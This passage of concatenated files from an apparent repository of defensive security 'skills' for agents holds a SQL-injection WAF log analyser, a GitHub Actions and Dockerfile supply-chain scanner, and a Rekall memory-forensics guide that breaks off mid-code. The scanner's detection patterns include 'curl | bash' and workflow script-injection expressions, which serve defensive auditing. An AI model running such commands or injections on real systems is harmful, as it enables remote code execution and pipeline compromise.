        source_ip = entry.get("httpRequest", {}).get("clientIp", "") or entry.get("ClientIP", "")
        action = entry.get("action", "") or entry.get("Action", "")

        payload = f"{uri}?{args}" if args else uri
        sqli_classes = classify_sqli(payload)

        if sqli_classes:
            findings.append({
                "source_ip": source_ip,
                "request_uri": payload[:500],
                "action": action,
                "sqli_classification": sqli_classes,
                "severity": max((c["severity"] for c in sqli_classes), key=lambda s: {"critical": 3, "high": 2, "medium": 1}.get(s, 0)),
            })
    return findings


def correlate_campaigns(findings, time_window_sec=300, min_requests=5):
    """Identify SQLi attack campaigns by source IP clustering."""
    ip_groups = defaultdict(list)
    for f in findings:
        ip_groups[f["source_ip"]].append(f)

    campaigns = []
    for ip, group in ip_groups.items():
        if len(group) >= min_requests:
            attack_types = set()
            for f in group:
                for c in f.get("sqli_classification", []):
                    attack_types.add(c["type"])
            campaigns.append({
                "source_ip": ip,
                "request_count": len(group),
                "attack_types": list(attack_types),
                "severity": "critical" if len(attack_types) > 2 else "high",
                "classification": "automated" if len(group) > 20 else "manual",
            })
            logger.warning("SQLi campaign: %s (%d requests, %d attack types)", ip, len(group), len(attack_types))
    return campaigns


def generate_report(findings, campaigns):
    """Generate SQLi detection report."""
    critical = [f for f in findings if f.get("severity") == "critical"]
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "total_sqli_events": len(findings),
        "critical_events": len(critical),
        "unique_sources": len(set(f["source_ip"] for f in findings if f.get("source_ip"))),
        "campaigns_detected": len(campaigns),
        "campaigns": campaigns,
        "top_findings": findings[:100],
    }
    print(f"SQLI REPORT: {len(findings)} events, {len(campaigns)} campaigns, {len(critical)} critical")
    return report


def main():
    parser = argparse.ArgumentParser(description="SQL Injection WAF Log Analysis Agent")
    parser.add_argument("--log-file", required=True, help="WAF log file path")
    parser.add_argument("--format", choices=["modsecurity", "json"], default="modsecurity")
    parser.add_argument("--output", default="sqli_report.json")
    args = parser.parse_args()

    if args.format == "modsecurity":
        entries = parse_modsecurity_audit_log(args.log_file)
        findings = analyze_modsecurity_entries(entries)
    else:
        entries = parse_json_waf_log(args.log_file)
        findings = analyze_json_waf_entries(entries)

    campaigns = correlate_campaigns(findings)
    report = generate_report(findings, campaigns)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/detecting-supply-chain-attacks-in-ci-cd/SKILL.md =====
---
name: detecting-supply-chain-attacks-in-ci-cd
description: 'Scans GitHub Actions workflows and CI/CD pipeline configurations for
  supply chain attack vectors including unpinned actions, script injection via expressions,
  dependency confusion, and secrets exposure. Uses PyGithub and YAML parsing for automated
  audit. Use when hardening CI/CD pipelines or investigating compromised build systems.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- supply-chain-security
- ci-cd-security
- github-actions
- pipeline-security
- dependency-pinning
- devsecops
version: '1.0'
author: mahipal
license: Apache-2.0
atlas_techniques:
- AML.T0010
nist_ai_rmf:
- GOVERN-5.2
- MAP-1.6
- MANAGE-2.2
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1195.002
- T1195.001
- T1199
- T1554
---

# Detecting Supply Chain Attacks in CI/CD


## When to Use

- When investigating security incidents that require detecting supply chain attacks in ci cd
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Scan CI/CD workflow files for supply chain risks by parsing GitHub Actions YAML,
checking for unpinned dependencies, script injection vectors, and secrets exposure.

```python
import yaml
from pathlib import Path

for wf in Path(".github/workflows").glob("*.yml"):
    with open(wf) as f:
        workflow = yaml.safe_load(f)
    for job_name, job in workflow.get("jobs", {}).items():
        for step in job.get("steps", []):
            uses = step.get("uses", "")
            if uses and "@" in uses and not uses.split("@")[1].startswith("sha"):
                print(f"Unpinned action: {uses} in {wf.name}")
```

Key supply chain risks:
1. Unpinned GitHub Actions (using @main instead of SHA)
2. Script injection via ${{ github.event }} expressions
3. Overly permissive GITHUB_TOKEN permissions
4. Third-party actions with write access to repo
5. Dependency confusion via public/private package name collision

## Examples

```python
# Check for script injection in run steps
for step in job.get("steps", []):
    run_cmd = step.get("run", "")
    if "${{" in run_cmd and "github.event" in run_cmd:
        print(f"Script injection risk: {run_cmd[:80]}")
```

===== END FILE =====


===== FILE: skills/detecting-supply-chain-attacks-in-ci-cd/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-supply-chain-attacks-in-ci-cd/references/api-reference.md =====
# API Reference: Detecting Supply Chain Attacks in CI/CD

## GitHub Actions Workflow Parsing

```python
import yaml

with open(".github/workflows/ci.yml") as f:
    wf = yaml.safe_load(f)

# Key fields
wf["permissions"]           # Workflow-level permissions
wf["jobs"]["build"]["steps"] # Step list
step["uses"]                # Action reference (owner/repo@ref)
step["run"]                 # Shell script
step["env"]                 # Environment variables
```

## Supply Chain Risk Patterns

| Risk | Pattern | Severity |
|------|---------|----------|
| Unpinned action | `uses: owner/action@main` | CRITICAL |
| Mutable tag | `uses: owner/action@v1` | MEDIUM |
| Script injection | `run: echo ${{ github.event.issue.title }}` | CRITICAL |
| Write permissions | `permissions: write-all` | HIGH |
| Curl pipe bash | `RUN curl \| bash` | HIGH |
| Latest image tag | `FROM image:latest` | MEDIUM |

## Dependency Confusion Check

```python
import requests
# Check if private package exists on public registry
resp = requests.get(f"https://registry.npmjs.org/{pkg}")
exists = resp.status_code == 200

resp = requests.get(f"https://pypi.org/pypi/{pkg}/json")
exists = resp.status_code == 200
```

## Pinning Actions to SHA

```yaml
# Bad: mutable reference
uses: actions/checkout@main
# Good: pinned to commit SHA
uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
```

### References

- GitHub Actions security hardening: https://docs.github.com/en/actions/security-guides
- StepSecurity: https://github.com/step-security/harden-runner
- Dependency confusion: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610

===== END FILE =====


===== FILE: skills/detecting-supply-chain-attacks-in-ci-cd/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for detecting supply chain attacks in CI/CD pipelines."""

import re
import json
import argparse
from pathlib import Path
from datetime import datetime

import yaml
import requests


def scan_workflow_file(workflow_path):
    """Scan a single GitHub Actions workflow file for supply chain risks."""
    with open(workflow_path) as f:
        workflow = yaml.safe_load(f)
    if not workflow or not isinstance(workflow, dict):
        return []
    findings = []
    permissions = workflow.get("permissions", {})
    if permissions == "write-all" or (isinstance(permissions, dict) and
                                      permissions.get("contents") == "write"):
        findings.append({
            "file": str(workflow_path),
            "issue": "Overly permissive workflow permissions",
            "severity": "HIGH",
            "detail": f"permissions: {permissions}",
        })
    for job_name, job in workflow.get("jobs", {}).items():
        for i, step in enumerate(job.get("steps", [])):
            uses = step.get("uses", "")
            if uses:
                findings.extend(check_action_pinning(str(workflow_path), job_name, uses))
            run_cmd = step.get("run", "")
            if run_cmd:
                findings.extend(check_script_injection(str(workflow_path), job_name, run_cmd))
            env_vars = step.get("env", {})
            for key, val in (env_vars or {}).items():
                if isinstance(val, str) and "${{" in val and "secrets." in val:
                    if "run" in step:
                        findings.append({
                            "file": str(workflow_path),
                            "job": job_name,
                            "issue": "Secret passed to environment variable in run step",
                            "severity": "MEDIUM",
                            "detail": f"{key}={val[:60]}",
                        })
    return findings


def check_action_pinning(filepath, job_name, uses):
    """Check if a GitHub Action is pinned to a commit SHA."""
    findings = []
    if "@" not in uses:
        return findings
    ref = uses.split("@")[1]
    if re.match(r'^[0-9a-f]{40}$', ref):
        return findings
    if ref in ("main", "master", "latest"):
        findings.append({
            "file": filepath,
            "job": job_name,
            "issue": f"Action pinned to mutable branch: {uses}",
            "severity": "CRITICAL",
        })
    elif re.match(r'^v\d+', ref):
        findings.append({
            "file": filepath,
            "job": job_name,
            "issue": f"Action pinned to mutable tag: {uses}",
            "severity": "MEDIUM",
            "recommendation": "Pin to full commit SHA instead of tag",
        })
    return findings


def check_script_injection(filepath, job_name, run_cmd):
    """Check for script injection via GitHub context expressions."""
    findings = []
    injection_patterns = [
        r"\$\{\{\s*github\.event\.issue\.title",
        r"\$\{\{\s*github\.event\.issue\.body",
        r"\$\{\{\s*github\.event\.pull_request\.title",
        r"\$\{\{\s*github\.event\.pull_request\.body",
        r"\$\{\{\s*github\.event\.comment\.body",
        r"\$\{\{\s*github\.event\.review\.body",
        r"\$\{\{\s*github\.head_ref",
    ]
    for pattern in injection_patterns:
        if re.search(pattern, run_cmd):
            findings.append({
                "file": filepath,
                "job": job_name,
                "issue": f"Script injection via untrusted input",
                "severity": "CRITICAL",
                "pattern": pattern,
                "detail": run_cmd[:100],
            })
    return findings


def scan_directory(directory):
    """Scan all workflow files in a directory."""
    all_findings = []
    workflow_dir = Path(directory) / ".github" / "workflows"
    if not workflow_dir.exists():
        workflow_dir = Path(directory)
    for wf in workflow_dir.glob("*.yml"):
        all_findings.extend(scan_workflow_file(str(wf)))
    for wf in workflow_dir.glob("*.yaml"):
        all_findings.extend(scan_workflow_file(str(wf)))
    return all_findings


def check_dependency_confusion(package_name, registry="npm"):
    """Check if a private package name exists on public registries."""
    urls = {
        "npm": f"https://registry.npmjs.org/{package_name}",
        "pypi": f"https://pypi.org/pypi/{package_name}/json",
    }
    url = urls.get(registry)
    if not url:
        return {"exists_publicly": False}
    try:
        resp = requests.get(url, timeout=10)
        return {
            "package": package_name,
            "registry": registry,
            "exists_publicly": resp.status_code == 200,
            "severity": "HIGH" if resp.status_code == 200 else "INFO",
        }
    except requests.RequestException:
        return {"package": package_name, "exists_publicly": False}


def scan_dockerfile(dockerfile_path):
    """Scan Dockerfile for supply chain risks."""
    findings = []
    with open(dockerfile_path) as f:
        lines = f.readlines()
    for i, line in enumerate(lines, 1):
        stripped = line.strip()
        if stripped.startswith("FROM") and ":latest" in stripped:
            findings.append({
                "file": str(dockerfile_path),
                "line": i,
                "issue": "Using :latest tag in FROM",
                "severity": "MEDIUM",
                "detail": stripped,
            })
        if "curl" in stripped and "| sh" in stripped or "| bash" in stripped:
            findings.append({
                "file": str(dockerfile_path),
                "line": i,
                "issue": "Piping curl output to shell",
                "severity": "HIGH",
                "detail": stripped[:100],
            })
    return findings


def main():
    parser = argparse.ArgumentParser(description="CI/CD Supply Chain Attack Detection Agent")
    parser.add_argument("--directory", default=".", help="Repository root to scan")
    parser.add_argument("--check-packages", nargs="*", help="Package names to check for confusion")
    parser.add_argument("--output", default="supply_chain_report.json")
    parser.add_argument("--action", choices=[
        "workflows", "dockerfiles", "packages", "full_scan"
    ], default="full_scan")
    args = parser.parse_args()

    report = {"generated_at": datetime.utcnow().isoformat(), "findings": {}}

    if args.action in ("workflows", "full_scan"):
        wf_findings = scan_directory(args.directory)
        report["findings"]["workflow_risks"] = wf_findings
        print(f"[+] Workflow risks found: {len(wf_findings)}")

    if args.action in ("dockerfiles", "full_scan"):
        df_findings = []
        for df in Path(args.directory).rglob("Dockerfile*"):
            df_findings.extend(scan_dockerfile(str(df)))
        report["findings"]["dockerfile_risks"] = df_findings
        print(f"[+] Dockerfile risks found: {len(df_findings)}")

    if args.action in ("packages", "full_scan") and args.check_packages:
        pkg_results = []
        for pkg in args.check_packages:
            pkg_results.append(check_dependency_confusion(pkg))
        report["findings"]["dependency_confusion"] = pkg_results
        public = [p for p in pkg_results if p.get("exists_publicly")]
        print(f"[+] Dependency confusion risks: {len(public)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/extracting-memory-artifacts-with-rekall/SKILL.md =====
---
name: extracting-memory-artifacts-with-rekall
description: 'Uses Rekall memory forensics framework to analyze memory dumps for process
  hollowing, injected code via VAD anomalies, hidden processes, and rootkit detection.
  Applies plugins like pslist, psscan, vadinfo, malfind, and dlllist to extract forensic
  artifacts from Windows memory images. Use during incident response memory analysis.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- memory-forensics
- rekall
- process-hollowing
- code-injection
- vad-analysis
- incident-response
- security-operations
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1055
- T1005
---

# Extracting Memory Artifacts with Rekall


## When to Use

- When performing authorized security testing that involves extracting memory artifacts with rekall
- When analyzing malware samples or attack artifacts in a controlled environment
- When conducting red team exercises or penetration testing engagements
- When building detection capabilities based on offensive technique understanding

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Use Rekall to analyze memory dumps for signs of compromise including process
injection, hidden processes, and suspicious network connections.

```python
from rekall import session
from rekall import plugins

# Create a Rekall session with a memory image
s = session.Session(
    filename="/path/to/memory.raw",
    autodetect=["rsds"],
    profile_path=["https://github.com/google/rekall-profiles/raw/master"]
)

# List processes
for proc in s.plugins.pslist():
    print(proc)

# Detect injected code
for result in s.plugins.malfind():
    print(result)
```

Key analysis steps:
1. Load memory image and auto-detect profile
2. Run pslist and psscan to find hidden processes
3. Use malfind to detect injected/hollowed code in process VADs
4. Examine network connections with netscan
5. Extract suspicious DLLs and drivers with dlllist/modules

## Examples

```python
from rekall import session
s = session.Session(filename="memory.raw")
# Compare pslist vs psscan for hidden processes
pslist_pids = set(p.pid for p in s.plugins.pslist())
psscan_pids = set(p.pid for p in s.plugins.psscan())
hidden = psscan_pids - pslist_pids
print(f"Hidden PIDs: {hidden}")
```

===== END FILE =====


===== FILE: skills/extracting-memory-artifacts-with-rekall/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/extracting-memory-artifacts-with-rekall/references/api-reference.md =====
# API Reference: Extracting Memory Artifacts with Rekall

## Rekall Session

```python
from rekall import session

s = session.Session(
    filename="/path/to/memory.raw",
    autodetect=["rsds"],
    profile_path=["https://github.com/google/rekall-profiles/raw/master"]
)
```

## Key Plugins

| Plugin | Purpose | Usage |
|--------|---------|-------|
| `pslist` | List active processes via EPROCESS | `s.plugins.pslist()` |
| `psscan` | Brute-force scan for EPROCESS | `s.plugins.psscan()` |
| `malfind` | Detect injected code (VAD) | `s.plugins.malfind()` |
| `netscan` | List network connections | `s.plugins.netscan()` |
| `dlllist` | List loaded DLLs | `s.plugins.dlllist(pids=[pid])` |
| `vadinfo` | VAD tree analysis | `s.plugins.vadinfo(pids=[pid])` |
| `modules` | List kernel modules | `s.plugins.modules()` |
| `handles` | List open handles | `s.plugins.handles(pids=[pid])` |
| `filescan` | Scan for FILE_OBJECT | `s.plugins.filescan()` |

## Hidden Process Detection

```python
pslist_pids = set(p.pid for p in s.plugins.pslist())
psscan_pids = set(p.pid for p in s.plugins.psscan())
hidden = psscan_pids - pslist_pids
```

## Malfind Output Fields

- `pid`: Process ID
- `name`: Process name
- `address`: VAD start address
- `protection`: Memory protection (PAGE_EXECUTE_READWRITE = suspicious)
- `tag`: Pool tag

## Command Line

```bash
rekall -f memory.raw pslist
rekall -f memory.raw malfind
rekall -f memory.raw netscan
rekall -f memory.raw dlllist --pid 1234
```

### References

- Rekall: https://github.com/google/rekall
- Rekall docs: https://rekall.readthedocs.io/
- Rekall profiles: https://github.com/google/rekall-profiles

===== END FILE =====


===== FILE: skills/extracting-memory-artifacts-with-rekall/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for extracting memory forensic artifacts using Rekall."""

import json
import argparse
from datetime import datetime

from rekall import session
from rekall import plugins


def create_session(image_path, profile_path=None):
    """Create a Rekall session for a memory image."""
    kwargs = {
        "filename": image_path,
        "autodetect": ["rsds"],
    }
    if profile_path:
        kwargs["profile_path"] = [profile_path]
    else:
        kwargs["profile_path"] = [
